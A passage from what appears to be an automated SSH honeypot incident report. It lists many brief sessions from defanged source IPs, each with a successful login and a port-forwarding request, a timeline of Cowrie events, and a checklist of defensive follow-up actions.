| `2026-08-20 16:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76999ed0d5cf

| Field | Detail |
|---|---|
| **Source IP** | `218.21.246[.]238` |
| **First Seen** | 2026-08-20 16:00 |
| **Last Seen** | 2026-08-20 16:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:00:29` | `cowrie.session.connect` |
| `2026-08-20 16:00:30` | `cowrie.client.version` |
| `2026-08-20 16:00:30` | `cowrie.client.kex` |
| `2026-08-20 16:00:33` | `cowrie.login.success` |
| `2026-08-20 16:00:33` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:00:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.246[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.21.246[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e11a4466b489

| Field | Detail |
|---|---|
| **Source IP** | `65.20.251[.]170` |
| **First Seen** | 2026-08-20 16:00 |
| **Last Seen** | 2026-08-20 16:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:00:38` | `cowrie.session.connect` |
| `2026-08-20 16:00:38` | `cowrie.client.version` |
| `2026-08-20 16:00:38` | `cowrie.client.kex` |
| `2026-08-20 16:00:40` | `cowrie.login.success` |
| `2026-08-20 16:00:40` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:00:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.251[.]170` to AbuseIPDB if not already reported
- [ ] Block `65.20.251[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-138e48ee563f

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-08-20 16:00 |
| **Last Seen** | 2026-08-20 16:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:00:50` | `cowrie.session.connect` |
| `2026-08-20 16:00:51` | `cowrie.client.version` |
| `2026-08-20 16:00:51` | `cowrie.client.kex` |
| `2026-08-20 16:00:53` | `cowrie.login.success` |
| `2026-08-20 16:00:53` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:00:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96add3ceb738

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:03 |
| **Last Seen** | 2026-08-20 16:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:03:14` | `cowrie.session.connect` |
| `2026-08-20 16:03:14` | `cowrie.client.version` |
| `2026-08-20 16:03:14` | `cowrie.client.kex` |
| `2026-08-20 16:03:17` | `cowrie.login.success` |
| `2026-08-20 16:03:17` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:03:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 16:03:17` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af2e1dc13218

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:04 |
| **Last Seen** | 2026-08-20 16:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:04:44` | `cowrie.session.connect` |
| `2026-08-20 16:04:44` | `cowrie.client.version` |
| `2026-08-20 16:04:45` | `cowrie.client.kex` |
| `2026-08-20 16:04:45` | `cowrie.login.success` |
| `2026-08-20 16:04:46` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:04:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 16:04:46` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:04:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f33172196b3

| Field | Detail |
|---|---|
| **Source IP** | `65.20.133[.]56` |
| **First Seen** | 2026-08-20 16:05 |
| **Last Seen** | 2026-08-20 16:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:05:07` | `cowrie.session.connect` |
| `2026-08-20 16:05:07` | `cowrie.client.version` |
| `2026-08-20 16:05:07` | `cowrie.client.kex` |
| `2026-08-20 16:05:09` | `cowrie.login.success` |
| `2026-08-20 16:05:09` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.133[.]56` to AbuseIPDB if not already reported
- [ ] Block `65.20.133[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a31eaab5c4f

| Field | Detail |
|---|---|
| **Source IP** | `14.97.77[.]182` |
| **First Seen** | 2026-08-20 16:05 |
| **Last Seen** | 2026-08-20 16:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:05:14` | `cowrie.session.connect` |
| `2026-08-20 16:05:15` | `cowrie.client.version` |
| `2026-08-20 16:05:15` | `cowrie.client.kex` |
| `2026-08-20 16:05:17` | `cowrie.login.success` |
| `2026-08-20 16:05:18` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:05:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.97.77[.]182` to AbuseIPDB if not already reported
- [ ] Block `14.97.77[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-099eb1a76503

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 16:12 |
| **Last Seen** | 2026-08-20 16:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:12:49` | `cowrie.session.connect` |
| `2026-08-20 16:12:49` | `cowrie.client.version` |
| `2026-08-20 16:12:49` | `cowrie.client.kex` |
| `2026-08-20 16:12:49` | `cowrie.login.success` |
| `2026-08-20 16:12:49` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:12:49` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82c47416b4fb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:13 |
| **Last Seen** | 2026-08-20 16:15 |
| **Session Duration** | 106s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:13:59` | `cowrie.session.connect` |
| `2026-08-20 16:14:00` | `cowrie.client.version` |
| `2026-08-20 16:14:00` | `cowrie.client.kex` |
| `2026-08-20 16:14:02` | `cowrie.login.success` |
| `2026-08-20 16:14:03` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:15:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 16:15:46` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6018f94020f6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:15 |
| **Last Seen** | 2026-08-20 16:15 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:15:27` | `cowrie.session.connect` |
| `2026-08-20 16:15:27` | `cowrie.client.version` |
| `2026-08-20 16:15:27` | `cowrie.client.kex` |
| `2026-08-20 16:15:31` | `cowrie.login.success` |
| `2026-08-20 16:15:37` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:15:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fc1bf6c2111

| Field | Detail |
|---|---|
| **Source IP** | `59.93.36[.]136` |
| **First Seen** | 2026-08-20 16:21 |
| **Last Seen** | 2026-08-20 16:21 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:21:06` | `cowrie.session.connect` |
| `2026-08-20 16:21:08` | `cowrie.client.version` |
| `2026-08-20 16:21:08` | `cowrie.client.kex` |
| `2026-08-20 16:21:11` | `cowrie.login.success` |
| `2026-08-20 16:21:12` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.93.36[.]136` to AbuseIPDB if not already reported
- [ ] Block `59.93.36[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ab5e69894d5

| Field | Detail |
|---|---|
| **Source IP** | `31.173.8[.]170` |
| **First Seen** | 2026-08-20 16:21 |
| **Last Seen** | 2026-08-20 16:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:21:18` | `cowrie.session.connect` |
| `2026-08-20 16:21:18` | `cowrie.client.version` |
| `2026-08-20 16:21:18` | `cowrie.client.kex` |
| `2026-08-20 16:21:20` | `cowrie.login.success` |
| `2026-08-20 16:21:20` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:21:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.8[.]170` to AbuseIPDB if not already reported
- [ ] Block `31.173.8[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-047a0da11f4d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:24 |
| **Last Seen** | 2026-08-20 16:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:24:41` | `cowrie.session.connect` |
| `2026-08-20 16:24:41` | `cowrie.client.version` |
| `2026-08-20 16:24:41` | `cowrie.client.kex` |
| `2026-08-20 16:24:44` | `cowrie.login.success` |
| `2026-08-20 16:24:44` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:24:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 16:24:44` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-882b02109309

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-20 16:24 |
| **Last Seen** | 2026-08-20 16:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:24:53` | `cowrie.session.connect` |
| `2026-08-20 16:24:54` | `cowrie.client.version` |
| `2026-08-20 16:24:54` | `cowrie.client.kex` |
| `2026-08-20 16:24:56` | `cowrie.login.success` |
| `2026-08-20 16:24:57` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:25:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b91b3d6d1236

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:25 |
| **Last Seen** | 2026-08-20 16:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:25:56` | `cowrie.session.connect` |
| `2026-08-20 16:25:57` | `cowrie.client.version` |
| `2026-08-20 16:25:57` | `cowrie.client.kex` |
| `2026-08-20 16:25:58` | `cowrie.login.success` |
| `2026-08-20 16:26:00` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:26:00` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 16:26:00` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33aac11fe804

| Field | Detail |
|---|---|
| **Source IP** | `218.4.156[.]254` |
| **First Seen** | 2026-08-20 16:30 |
| **Last Seen** | 2026-08-20 16:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:30:14` | `cowrie.session.connect` |
| `2026-08-20 16:30:15` | `cowrie.client.version` |
| `2026-08-20 16:30:15` | `cowrie.client.kex` |
| `2026-08-20 16:30:17` | `cowrie.login.success` |
| `2026-08-20 16:30:17` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.4.156[.]254` to AbuseIPDB if not already reported
- [ ] Block `218.4.156[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91625d60d13a

| Field | Detail |
|---|---|
| **Source IP** | `61.169.54[.]150` |
| **First Seen** | 2026-08-20 16:34 |
| **Last Seen** | 2026-08-20 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:34:08` | `cowrie.session.connect` |
| `2026-08-20 16:34:09` | `cowrie.client.version` |
| `2026-08-20 16:34:09` | `cowrie.client.kex` |
| `2026-08-20 16:34:11` | `cowrie.login.success` |
| `2026-08-20 16:34:12` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.169.54[.]150` to AbuseIPDB if not already reported
- [ ] Block `61.169.54[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f9a29dbe2f8

| Field | Detail |
|---|---|
| **Source IP** | `218.21.250[.]151` |
| **First Seen** | 2026-08-20 16:34 |
| **Last Seen** | 2026-08-20 16:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:34:17` | `cowrie.session.connect` |
| `2026-08-20 16:34:18` | `cowrie.client.version` |
| `2026-08-20 16:34:18` | `cowrie.client.kex` |
| `2026-08-20 16:34:20` | `cowrie.login.success` |
| `2026-08-20 16:34:21` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:34:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.21.250[.]151` to AbuseIPDB if not already reported
- [ ] Block `218.21.250[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-774f1e98c1c7

| Field | Detail |
|---|---|
| **Source IP** | `211.23.109[.]116` |
| **First Seen** | 2026-08-20 16:34 |
| **Last Seen** | 2026-08-20 16:34 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:34:20` | `cowrie.session.connect` |
| `2026-08-20 16:34:21` | `cowrie.client.version` |
| `2026-08-20 16:34:21` | `cowrie.client.kex` |
| `2026-08-20 16:34:24` | `cowrie.login.success` |
| `2026-08-20 16:34:25` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:34:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.23.109[.]116` to AbuseIPDB if not already reported
- [ ] Block `211.23.109[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8571462943aa

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]124` |
| **First Seen** | 2026-08-20 16:34 |
| **Last Seen** | 2026-08-20 16:34 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:34:31` | `cowrie.session.connect` |
| `2026-08-20 16:34:31` | `cowrie.client.version` |
| `2026-08-20 16:34:31` | `cowrie.client.kex` |
| `2026-08-20 16:34:34` | `cowrie.login.success` |
| `2026-08-20 16:34:35` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]124` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85d42b87dcf0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:35 |
| **Last Seen** | 2026-08-20 16:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:35:19` | `cowrie.session.connect` |
| `2026-08-20 16:35:19` | `cowrie.client.version` |
| `2026-08-20 16:35:19` | `cowrie.client.kex` |
| `2026-08-20 16:35:25` | `cowrie.login.success` |
| `2026-08-20 16:35:25` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:35:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 16:35:26` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:35:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcf0e80c6fcb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 16:36 |
| **Last Seen** | 2026-08-20 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:36:34` | `cowrie.session.connect` |
| `2026-08-20 16:36:34` | `cowrie.client.version` |
| `2026-08-20 16:36:34` | `cowrie.client.kex` |
| `2026-08-20 16:36:35` | `cowrie.login.success` |
| `2026-08-20 16:36:35` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:36:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 16:36:35` | `cowrie.direct-tcpip.data` |
| `2026-08-20 16:36:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-645a09c6aa16

| Field | Detail |
|---|---|
| **Source IP** | `122.187.229[.]220` |
| **First Seen** | 2026-08-20 16:38 |
| **Last Seen** | 2026-08-20 16:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:38:45` | `cowrie.session.connect` |
| `2026-08-20 16:38:45` | `cowrie.client.version` |
| `2026-08-20 16:38:45` | `cowrie.client.kex` |
| `2026-08-20 16:38:48` | `cowrie.login.success` |
| `2026-08-20 16:38:49` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.229[.]220` to AbuseIPDB if not already reported
- [ ] Block `122.187.229[.]220` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda0179f493a

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-08-20 16:38 |
| **Last Seen** | 2026-08-20 16:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 16:38:57` | `cowrie.session.connect` |
| `2026-08-20 16:38:58` | `cowrie.client.version` |
| `2026-08-20 16:38:58` | `cowrie.client.kex` |
| `2026-08-20 16:39:01` | `cowrie.login.success` |
| `2026-08-20 16:39:02` | `cowrie.direct-tcpip.request` |
| `2026-08-20 16:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38b9fb5afdaa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 16:41 |
| **Last Seen** | 2026-08-20 16:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
